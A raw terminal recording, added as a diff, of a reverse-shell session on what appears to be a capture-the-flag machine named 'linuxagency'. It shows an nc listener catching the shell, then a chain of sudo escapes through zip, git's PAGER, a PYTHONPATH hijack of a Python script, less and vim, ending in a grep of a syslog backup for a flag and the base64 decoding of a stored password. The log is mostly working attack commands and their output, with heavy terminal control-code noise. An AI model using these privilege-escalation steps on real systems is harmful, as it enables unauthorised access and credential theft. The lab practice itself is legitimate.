@@ -1,0 +1,214 @@
+Script started on 2025-11-09 12:04:56+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="26"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [192.168.77.193] from (UNKNOWN) [192.168.64.1] 9748
+bash: cannot set terminal process group (3986): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+dalia@linuxagency:~$ [Kdalia@linuxagency:~$ [Kn/bash'^[[201~[?2004hdalia@linuxagency:~$ [7msudo -u sean vim -c ':!/bin/bash'[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo -u sean vim -c ':!/bin/bash'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Kdalia@linuxagency:~$ [Kdalia@linuxagency:~$ [K[?2004hdalia@linuxagency:~$ [7msudo -u sean vim -c ':!/bin/bash'[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo -u sean vim -c ':!/bin/bash'[C[1P'[1P'[1P'[1P's'h'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u sean vim -c ':!/bin/sh'
+[Ksudo -u sean vim -c ':!/bin/sh'[Ksudo -u sean vim -c ':!/bin/sh'[Ksudo -u sean vim -c ':!/bin/sh'
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+dalia@linuxagency:~$ [Kdalia@linuxagency:~$ [K[?2004hdalia@linuxagency:~$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l[Ksudo -l[Ksudo -l
+Matching Defaults entries for dalia on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dalia may run the following commands on linuxagency:
+    (silvio) NOPASSWD: /usr/bin/zip
+dalia@linuxagency:~$ [Kdalia@linuxagency:~$ [K[?2004hdalia@linuxagency:~$ [7mTF=$(mktemp -u)[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hTF=$(mktemp -u)
+[KTF=$(mktemp -u)[KTF=$(mktemp -u)[KTF=$(mktemp -u)
+dalia@linuxagency:~$ [Kdalia@linuxagency:~$ [KTF /etc/hosts -T[?2004hdalia@linuxagency:~$ [7msudo zip $TF /etc/hosts -T -TT 'sh #'[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo zip $TF /etc/hosts -T -TT 'sh #'[C[1P[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hudo zip $TF /etc/hosts -T -TT 'sh #'
+[Kudo zip $TF /etc/hosts -T -TT 'sh #'[Kudo zip $TF /etc/hosts -T -TT 'sh #'[Kudo zip $TF /etc/hosts -T -TT 'sh #'
+
+Command 'udo' not found, but can be installed with:
+
+apt install udo
+
+Please ask your administrator.
+dalia@linuxagency:~$ [Kdalia@linuxagency:~$ [K[?2004hdalia@linuxagency:~$ udo zip $TF /etc/hosts -T -TT 'sh #'[1@s[C[C[C[C[1@-[1@u[1@ [25PTF=$(mktemp -u)[8Psudo -lu sean vim -c ':!/bin/sh'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/0000ZZqZZZZZZq[A[Aexit[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls -al[4Pcdls -al[2Pexit2R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/0000ZZqZZZZZZq[A[A[52Psudo -u sean vim -c ':!/bin/sh'
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cl[KTF=$(mktemp -u)sudo -u zip $TF /etc/hosts -T -TT 'sh #'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ksudo -u zip $TF /etc/hosts -T -TT 'sh #'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[25PTF=$(mktemp -u)[8Psudo -lu sean vim -c ':!/bin/sh'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/0000ZZqZZZZZZq[A[Aexit[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls -al[4Pcdsudo -u sean vim -c ':!/bin/bash'l[Ku sean vim -c ':!/bin/bash'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccd[Kls -al[2Pexit2R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/0000ZZqZZZZZZq[A[A[52Psudo -u sean vim -c ':!/bin/sh'
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cl[KTF=$(mktemp -u)sudo -u zip $TF /etc/hosts -T -TT 'sh #'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[25PTF=$(mktemp -u)[8Psudo -lu sean vim -c ':!/bin/sh'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/0000ZZqZZZZZZq[A[Aexit[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls -al[4Pcdsudo -u sean vim -c ':!/bin/bash'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccd[Kls -al[2Pexit2R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/0000ZZqZZZZZZq[A[A[52Psudo -u sean vim -c ':!/bin/sh'
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cl[KTF=$(mktemp -u)sudo -u zip $TF /etc/hosts -T -TT 'sh #'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ksudo -u zip $TF /etc/hosts -T -TT 'sh #'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[25PTF=$(mktemp -u)[8Psudo -lu sean vim -c ':!/bin/sh'l[KTF=$(mktemp -u)sudo -u zip $TF /etc/hosts -T -TT 'sh #'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ksudo -u zip $TF /etc/hosts -T -TT 'sh #'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[25PTF=$(mktemp -u)[8Psudo -lu sean vim -c ':!/bin/sh'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/0000ZZqZZZZZZq[A[Aexit[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/0000ZZqZZZZZZq[A[A[52Psudo -u sean vim -c ':!/bin/sh'
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cl[KTF=$(mktemp -u)sudo -u zip $TF /etc/hosts -T -TT 'sh #'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ksudo -u zip $TF /etc/hosts -T -TT 'sh #'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[25PTF=$(mktemp -u)[8Psudo -lu sean vim -c ':!/bin/sh'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/00002R0;10;1c10;rgb:ffff/ffff/ffff11;rgb:0000/0000/0000ZZqZZZZZZq[A[Aexit[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls -al[4Pcdsudo -u sean vim -c ':!/bin/bash'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kexir[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexir
+[Kexir[Kexir[Kexir
+
+Command 'exir' not found, did you mean:
+
+  command 'exif' from deb exif
+  command 'exim' from deb exim4-daemon-heavy
+  command 'exim' from deb exim4-daemon-light
+  command 'expr' from deb coreutils
+
+Try: apt install <deb name>
+
+dalia@linuxagency:~$ [Kdalia@linuxagency:~$ [K[?2004hdalia@linuxagency:~$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-11-09 12:07:07+03:00 [COMMAND_EXIT_CODE="0"]
+Script started on 2025-11-09 12:07:18+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="26"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [192.168.77.193] from (UNKNOWN) [192.168.64.1] 9749
+bash: cannot set terminal process group (4060): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+dalia@linuxagency:~$ [Kdalia@linuxagency:~$ [K^[[201~[?2004hdalia@linuxagency:~$ [7mTF=$(mktemp -u)[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hTF=$(mktemp -u)
+[KTF=$(mktemp -u)[KTF=$(mktemp -u)[KTF=$(mktemp -u)
+dalia@linuxagency:~$ [Kdalia@linuxagency:~$ [K[?2004hdalia@linuxagency:~$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l[Ksudo -l[Ksudo -l
+Matching Defaults entries for dalia on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dalia may run the following commands on linuxagency:
+    (silvio) NOPASSWD: /usr/bin/zip
+dalia@linuxagency:~$ [Kdalia@linuxagency:~$ [K[?2004hdalia@linuxagency:~$ [7msudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
+[Ksudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'[Ksudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'[Ksudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 37%)
+[K[K[?2004hpython3 -c 'import pty;pty,[K.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Ksilvio@linuxagency:/home/dalia$ [Ksilvio@linuxagency:/home/dalia$ [K[?2004hsilvio@linuxagency:/home/dalia$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l
+[KMatching Defaults entries for silvio on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User silvio may run the following commands on linuxagency:
+    (reza) SETENV: NOPASSWD: /usr/bin/git
+silvio@linuxagency:/home/dalia$ [Ksilvio@linuxagency:/home/dalia$ [K[?2004hsilvio@linuxagency:/home/dalia$ [7msudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
+[K<do -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
+[K$ [K$ [K[?2004h$ sudo -l[C[C[?2004l[C[C[K[?2004hsudo -l
+[Ksudo -l
+[KMatching Defaults entries for reza on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User reza may run the following commands on linuxagency:
+    (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
+$ [K$ [K[?2004h$ cd /t,p[K[Kmp[C[C[?2004l[C[C[K[?2004hcd /tmp
+[Kcd /tmp
+[K[K[?2004hls[K[?2004l$ [K[?2004h$ ls[?2004l[C[C[K[?2004hls
+[Kls
+[Kshop
+systemd-private-6a09eac88d2f4d2f8201d6f455522026-apache2.service-vR26tK
+systemd-private-6a09eac88d2f4d2f8201d6f455522026-systemd-resolved.service-3Y86Gd
+systemd-private-6a09eac88d2f4d2f8201d6f455522026-systemd-timesyncd.service-z3a5NH
+ziaL1ebT
+ziubyes0
+$ [K$ [K[?2004h$ [7msudo -u jordan PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py[27m[C[C[?2004l[C[C[K[?2004hsudo -u jordan PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py
+[Ksudo -u jordan PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py
+[Kjordan@linuxagency:/tmp$ [Kjordan@linuxagency:/tmp$ [K[?2004hjordan@linuxagency:/tmp$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l
+[KMatching Defaults entries for jordan on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jordan may run the following commands on linuxagency:
+    (ken) NOPASSWD: /usr/bin/less
+jordan@linuxagency:/tmp$ [Kjordan@linuxagency:/tmp$ [K[?2004hjordan@linuxagency:/tmp$ [7msudo -u ken less /etc/profile[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u ken less /etc/profile
+[Ksudo -u ken less /etc/profile
+[KWARNING: terminal is not fully functional
+/etc/profile  (press RETURN)[K/etc/profile  (press RETURN)[K[?2004h/etc/profile  (press RETURN)[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K[K[K# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
+# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).
+
+if [ "${PS1-}" ]; then
+  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
+    # The file bash.bashrc already sets the default PS1.
+    # PS1='\h:\w\$ '
+    if [ -f /etc/bash.bashrc ]; then
+      . /etc/bash.bashrc
+    fi
+  else
+    if [ "`id -u`" -eq 0 ]; then
+      PS1='# '
+    else
+      PS1='$ '
+    fi
+  fi
+fi
+
+if [ -d /etc/profile.d ]; then
+  for i in /etc/profile.d/*.sh; do
+    if [ -r $i ]; then
+      . $i
+/etc/profile[K/etc/profile[K[?2004h/etc/profile[7m!/bin/sh[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h!/bin/sh
+[K!//bbii[K!/bi[K!//bbiinn//sshh!/bin/sh
+$ [K$ [K[?2004h$ sudo -l[C[C[?2004l[C[C[K[?2004hsudo -l
+[Ksudo -l
+[KMatching Defaults entries for ken on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ken may run the following commands on linuxagency:
+    (sean) NOPASSWD: /usr/bin/vim
+$ [K$ [K[?2004h$ [7msudo -u sean vim -c ':!/bin/sh'[27m[C[C[?2004l[C[C[K[?2004hsudo -u sean vim -c ':!/bin/sh'
+[Ksudo -u sean vim -c ':!/bin/sh'
+[K
+E558: Terminal entry not found in terminfo
+'unknown' not known. Available builtin terminals are:
+    builtin_amiga
+    builtin_beos-ansi
+    builtin_ansi
+    builtin_pcansi
+    builtin_win32
+    builtin_vt320
+    builtin_vt52
+    builtin_xterm
+    builtin_iris-ansi
+    builtin_debug
+    builtin_dumb
+defaulting to 'ansi'
+[K[0m[H[2J[24;1H:!/bin/sh[24;1H
+[K$ [K$ [K[?2004h$ whoami[C[C[?2004l[C[C[K[?2004hwhoami
+[Kwhoami
+[Ksean
+$ [K$ [K[?2004h$ cd[?2004l[C[C[K[?2004hcd
+[Kcd
+[K$ [K$ [K[?2004h$ ls -al[C[C[?2004l[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 32
+drwxr-x---  2 sean sean 4096 Jan 12  2021 .
+drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
+lrwxrwxrwx  1 sean sean    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 sean sean  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 sean sean 3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 sean sean 8980 Jan 12  2021 examples.desktop
+-rw-r--r--  1 sean sean  807 Jan 12  2021 .profile
+$ [K$ [K[?2004h$ cat /var/;[Klog/syslog.bak | grep sean[C[C[?2004l[C[C[K[?2004hcat /var/log/syslog.bak | grep sean
+[Kcat /var/log/syslog.bak | grep sean
+[KJan 12 02:58:58 ubuntu kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : sean{4c5685f4db7966a43cf8e95859801281} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==
+[K$ [K$ [K[?2004h$ echo [7mVGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==[27m[C[C[C[C[C[C[CVGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg== | base64 -d[C[C[?2004l[C[C[K[?2004hecho VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg== | base64 -d
+[Kecho VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg== | base64 -d
+[KThe password of penelope is p3nelope
+$ [K$ [K[?2004h$ echo VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg== | base64 -d[C[C[34Pcat /var/log/syslog.bak | grep sean[C[Cecho VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg== | base64 -d[C[C[Kexit[C[C[?2004l[C[C[K[?2004hexit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K
+[?2004l
+Script done on 2025-11-09 12:12:41+03:00 [COMMAND_EXIT_CODE="1"]
